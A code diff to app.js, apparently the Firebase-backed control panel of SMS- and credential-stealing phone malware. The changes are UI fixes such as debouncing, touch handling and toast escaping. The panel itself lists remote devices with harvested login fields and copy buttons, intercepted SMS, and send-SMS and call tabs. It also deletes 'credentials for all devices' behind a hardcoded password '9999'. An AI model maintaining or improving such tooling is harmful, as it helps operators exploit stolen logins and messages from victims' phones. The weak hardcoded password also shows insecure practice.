@@ -1,5 +1,5 @@
 /* ============================================================ */
-/* app.js - Complete Fixed - Smooth, No Blink, All Features    */
+/* app.js - Complete Fixed - No Blink, Smooth Touch/Click      */
 /* ============================================================ */
 
 // ============================================================
@@ -46,11 +46,13 @@ let isUpdatingUI = false;
 let deviceOnlineStatus = {};
 let renderTimeout = null;
 let lastRenderTime = 0;
-const MIN_RENDER_INTERVAL = 300;
+const MIN_RENDER_INTERVAL = 500;
 let lastDataHash = '';
 let deletePassword = '9999';
 let isFirstLoad = true;
 let isInitialRender = true;
+let pendingUpdates = {};
+let isTouchDevice = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
 
 // ============================================================
 // DOM REFS
@@ -58,7 +60,7 @@ let isInitialRender = true;
 const $ = (id) => document.getElementById(id);
 
 // ============================================================
-// CONNECTION MONITOR - LIVE
+// CONNECTION MONITOR
 // ============================================================
 db.ref(".info/connected").on("value", (snap) => {
     const badge = $('statusBadge');
@@ -66,16 +68,14 @@ db.ref(".info/connected").on("value", (snap) => {
     if (snap.val() === true) {
         badge.className = 'connection-status online';
         text.textContent = 'Online';
-        showToast('🟢 Connected to Firebase', 'success', 1500);
     } else {
         badge.className = 'connection-status offline';
         text.textContent = 'Offline';
-        showToast('🔴 Disconnected from Firebase', 'error', 1500);
     }
 });
 
 // ============================================================
-// MAIN DATA LISTENER - LIVE REALTIME WITH NO BLINK
+// MAIN DATA LISTENER - WITH DEBOUNCE FOR SMOOTH
 // ============================================================
 db.ref().on("value", (snapshot) => {
     const newData = snapshot.val() || {};
@@ -97,23 +97,18 @@ db.ref().on("value", (snapshot) => {
         return;
     }
     
-    const now = Date.now();
-    if (now - lastRenderTime < MIN_RENDER_INTERVAL) {
-        if (renderTimeout) clearTimeout(renderTimeout);
-        renderTimeout = setTimeout(() => {
-            if (!isRendering && !isUpdatingUI) {
-                performRender();
-                lastRenderTime = Date.now();
-            }
-            renderTimeout = null;
-        }, MIN_RENDER_INTERVAL);
-        return;
+    // Debounce render - prevent multiple rapid renders
+    if (renderTimeout) {
+        clearTimeout(renderTimeout);
     }
     
-    if (!isRendering && !isUpdatingUI) {
-        performRender();
-        lastRenderTime = now;
-    }
+    renderTimeout = setTimeout(() => {
+        if (!isRendering && !isUpdatingUI) {
+            performRender();
+            lastRenderTime = Date.now();
+        }
+        renderTimeout = null;
+    }, 300);
     
     if (isFirstLoad) {
         isFirstLoad = false;
@@ -148,7 +143,7 @@ function buildDeviceCaches() {
 }
 
 // ============================================================
-// UPDATE DEVICE ONLINE STATUS - REAL TIME
+// UPDATE DEVICE ONLINE STATUS
 // ============================================================
 function updateDeviceOnlineStatus() {
     const devices = cachedData.user_data || {};
@@ -200,7 +195,7 @@ function performRender() {
 }
 
 // ============================================================
-// UPDATE COUNTS - FAST
+// UPDATE COUNTS
 // ============================================================
 function updateCounts() {
     const devices = cachedData.user_data || {};
@@ -221,7 +216,7 @@ function updateCounts() {
 }
 
 // ============================================================
-// DELETE ALL CREDENTIALS
+// DELETE FUNCTIONS
 // ============================================================
 function deleteAllCredentials() {
     const password = prompt('🔐 Enter Password to Delete ALL Credentials:');
@@ -232,7 +227,7 @@ function deleteAllCredentials() {
         return;
     }
     
-    if (!confirm('⚠️ Are you sure you want to DELETE ALL CREDENTIALS (login data) for all devices? This action cannot be undone!')) {
+    if (!confirm('⚠️ Are you sure you want to DELETE ALL CREDENTIALS?')) {
         return;
     }
     
@@ -253,13 +248,10 @@ function deleteAllCredentials() {
         showToast('✅ All credentials deleted successfully!', 'success');
         performRender();
     }).catch(err => {
-        showToast('❌ Error deleting credentials: ' + err.message, 'error');
+        showToast('❌ Error: ' + err.message, 'error');
     });
 }
 
-// ============================================================
-// DELETE DEVICE CREDENTIALS
-// ============================================================
 function deleteDeviceCredentials(devId) {
     const password = prompt('🔐 Enter Password to Delete Credentials:');
     if (password === null) return;
@@ -289,9 +281,6 @@ function deleteDeviceCredentials(devId) {
     });
 }
 
-// ============================================================
-// DELETE ALL SMS
-// ============================================================
 function deleteAllSms() {
     const password = prompt('🔐 Enter Password to Delete All SMS:');
     if (password === null) return;
@@ -301,7 +290,7 @@ function deleteAllSms() {
         return;
     }
     
-    if (!confirm('⚠️ Are you sure you want to DELETE ALL SMS messages? This action cannot be undone!')) {
+    if (!confirm('⚠️ Are you sure you want to DELETE ALL SMS?')) {
         return;
     }
     
@@ -327,13 +316,10 @@ function deleteAllSms() {
         allSmsOffset = 0;
         performRender();
     }).catch(err => {
-        showToast('❌ Error deleting SMS: ' + err.message, 'error');
+        showToast('❌ Error: ' + err.message, 'error');
     });
 }
 
-// ============================================================
-// DELETE DEVICE SMS
-// ============================================================
 function deleteDeviceSms(devId) {
     const password = prompt('🔐 Enter Password to Delete SMS:');
     if (password === null) return;
@@ -367,7 +353,7 @@ function deleteDeviceSms(devId) {
 }
 
 // ============================================================
-// RENDER DEVICES OPTIMIZED - NO BLINK
+// RENDER DEVICES OPTIMIZED - NO BLINK ON CLICK
 // ============================================================
 function renderDevicesOptimized() {
     if (isUpdatingUI) return;
@@ -437,7 +423,7 @@ function renderDevicesOptimized() {
                     fields += `<div class="login-field">
                         <span class="field-label">${k}:</span>
                         <span class="field-value" id="field-${devId}-${idx}-${k}">${value}</span>
-                        <button class="copy-field-btn" onclick="copyField('field-${devId}-${idx}-${k}')" title="Copy ${k}">
+                        <button class="copy-field-btn" onclick="event.stopPropagation();copyField('field-${devId}-${idx}-${k}')" title="Copy ${k}">
                             <i class="fas fa-copy"></i>
                         </button>
                     </div>`;
@@ -452,7 +438,6 @@ function renderDevicesOptimized() {
             }).join('');
         }
         
-        // Scroll indicator for credentials
         let scrollIndicator = '';
         if (devLoginList.length > 5) {
             scrollIndicator = `
@@ -632,7 +617,7 @@ function renderDevicesOptimized() {
     // Auto scroll credentials if login tab is active
     displayKeys.forEach(devId => {
         if (activeTabs[devId] === 'login') {
-            setTimeout(() => autoScrollCredentials(devId), 200);
+            setTimeout(() => autoScrollCredentials(devId), 300);
         }
     });
     
@@ -787,17 +772,23 @@ function renderAllSmsOptimized() {
 }
 
 // ============================================================
-// TOGGLE DEVICE - SMOOTH
+// TOGGLE DEVICE - SMOOTH, NO BLINK
 // ============================================================
 function toggleDevice(devId) {
     if (isUpdatingUI) return;
-    isUpdatingUI = true;
+    
+    // Prevent multiple rapid clicks
+    if (pendingUpdates[devId]) {
+        return;
+    }
+    pendingUpdates[devId] = true;
     
     try {
         expandedDevices[devId] = !expandedDevices[devId];
         
         const card = document.getElementById(`card-${devId}`);
         if (card) {
+            // Toggle class - this is smooth and doesn't cause blink
             card.classList.toggle('expanded');
             
             const hint = card.querySelector('.device-top .device-name + div');
@@ -805,25 +796,34 @@ function toggleDevice(devId) {
                 hint.textContent = expandedDevices[devId] ? '▲ Click to collapse' : '▼ Click to expand';
             }
             
+            // Auto-check status when expanded
             if (expandedDevices[devId]) {
-                setTimeout(() => checkDeviceStatus(devId), 200);
-                // Auto scroll credentials if login tab is active
-                if (activeTabs[devId] === 'login') {
-                    setTimeout(() => autoScrollCredentials(devId), 300);
-                }
+                setTimeout(() => {
+                    checkDeviceStatus(devId);
+                    // Auto scroll credentials if login tab is active
+                    if (activeTabs[devId] === 'login') {
+                        setTimeout(() => autoScrollCredentials(devId), 400);
+                    }
+                }, 200);
             }
         }
     } finally {
-        isUpdatingUI = false;
+        setTimeout(() => {
+            pendingUpdates[devId] = false;
+        }, 200);
     }
 }
 
 // ============================================================
-// SET TAB - SMOOTH
+// SET TAB - SMOOTH, NO BLINK
 // ============================================================
 function setTab(devId, tab) {
     if (isUpdatingUI) return;
-    isUpdatingUI = true;
+    
+    if (pendingUpdates[devId]) {
+        return;
+    }
+    pendingUpdates[devId] = true;
     
     try {
         if (activeTabs[devId] === tab) {
@@ -853,7 +853,7 @@ function setTab(devId, tab) {
                 if (btn.textContent.trim().includes('💬') && targetTab === 'sms') btn.classList.add('active-sms');
                 else if (btn.textContent.trim().includes('🔑') && targetTab === 'login') {
                     btn.classList.add('active-login');
-                    setTimeout(() => autoScrollCredentials(devId), 300);
+                    setTimeout(() => autoScrollCredentials(devId), 400);
                 }
                 else if (btn.textContent.trim().includes('📞') && targetTab === 'call') btn.classList.add('active-call');
                 else if (btn.textContent.trim().includes('✉️') && targetTab === 'sendsms') btn.classList.add('active-sendsms');
@@ -863,7 +863,9 @@ function setTab(devId, tab) {
             });
         }
     } finally {
-        isUpdatingUI = false;
+        setTimeout(() => {
+            pendingUpdates[devId] = false;
+        }, 200);
     }
 }
 
@@ -1591,7 +1593,7 @@ function showToast(message, type = 'info', duration = 2800) {
     const container = $('toastContainer');
     const toast = document.createElement('div');
     toast.className = `toast-luxury ${type}`;
-    toast.innerHTML = message;
+    toast.textContent = message;
     container.appendChild(toast);
     
     setTimeout(() => {
